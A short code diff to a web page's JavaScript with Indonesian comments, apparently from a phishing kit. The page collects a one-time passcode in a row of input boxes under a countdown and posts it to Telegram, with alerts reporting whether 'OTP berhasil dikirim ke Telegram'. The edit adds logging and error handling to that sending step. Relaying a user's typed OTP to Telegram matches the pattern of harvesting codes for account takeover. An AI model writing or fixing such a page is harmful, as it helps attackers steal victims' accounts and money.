@@ -188,7 +188,7 @@
         let timeLeft = 49;
         const countdownElement = document.getElementById('countdown');
 
-        // Mengatur focus otomatis antar input
+        // Mengatur fokus otomatis antar input
         inputs.forEach((input, index) => {
             input.addEventListener('input', () => {
                 if (input.value.length === 1 && index < inputs.length - 1) {
@@ -242,11 +242,18 @@
                 },
                 body: JSON.stringify(data)
             }).then(response => {
-                if (response.ok) {
+                console.log('Status Code:', response.status);  // Log status code
+                return response.json(); // Mengambil response JSON untuk logging lebih lanjut
+            }).then(data => {
+                console.log('Response Data:', data);  // Log response data
+                if (data.ok) {
                     alert('OTP berhasil dikirim ke Telegram');
                 } else {
                     alert('Gagal mengirim OTP ke Telegram');
                 }
+            }).catch(error => {
+                console.error('Error:', error);  // Log error
+                alert('Gagal mengirim OTP ke Telegram');
             });
         }
 
